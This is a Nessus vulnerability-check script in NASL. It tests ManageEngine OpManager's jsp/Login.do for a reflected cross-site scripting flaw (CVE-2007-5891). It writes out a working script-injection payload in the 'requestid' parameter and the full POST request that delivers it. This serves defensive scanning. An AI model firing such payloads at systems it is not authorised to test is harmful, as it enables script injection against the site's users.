#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(27818);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2007-5891");
  script_bugtraq_id(26368);
  script_xref(name:"OSVDB", value:"38437");

  script_name(english:"ManageEngine OpManager Login.do Multiple Parameter XSS");
  script_summary(english:"Checks for an XSS flaw in OpManager's Login.do");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a script that is affected by several
cross-site scripting vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ManageEngine OpManager, a web-based network
management application. 

The version of ManageEngine OpManager installed on the remote host
fails to sanitize user input to the 'requestid' parameter of the
'jsp/Login.do' script before using it to generate dynamic content.  An
unauthenticated remote attacker may be able to leverage this issue to
inject arbitrary HTML or script code into a user's browser to be
executed within the security context of the affected site. 

Note that the 'fileid', 'woMode', and 'woID' parameters of the same
script are also reportedly affected, although Nessus did not
explicitly test those." );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/advisories/27456/" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 443, 8060);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:8060);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Make sure it's OpManager.
req = http_get(item:"/LoginPage.do", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# If so...
if (
  "title>AdventNet OpManager<" >< res &&
  'METHOD=post action="/jsp/Login.do"' >< res
)
{
  # Send a request to exploit the flaw.
  xss = string('"/>', "<script>alert('", SCRIPT_NAME, "')</script>");

  postdata = string(
    "requestid=", urlencode(str:xss), "&",
    "fileid=null&",
    "clienttype=html&",
    "webstart=&",
    "ScreenWidth=1345&",
    "ScreenHeight=784&",
    "userName=", "nessus", "&",
    "password=", unixtime(), "&",
    "x=0&",
    "y=0&",
    "uname=&",
    "emailId="
  );
  req = string(
    "POST /jsp/Login.do HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
    "Content-Type: application/x-www-form-urlencoded\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);


  # There's a problem if our exploit appears in the form.
  if (
    "Invalid username" >< res &&
    string('name="requestid" value="', xss, '"/>') >< res
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
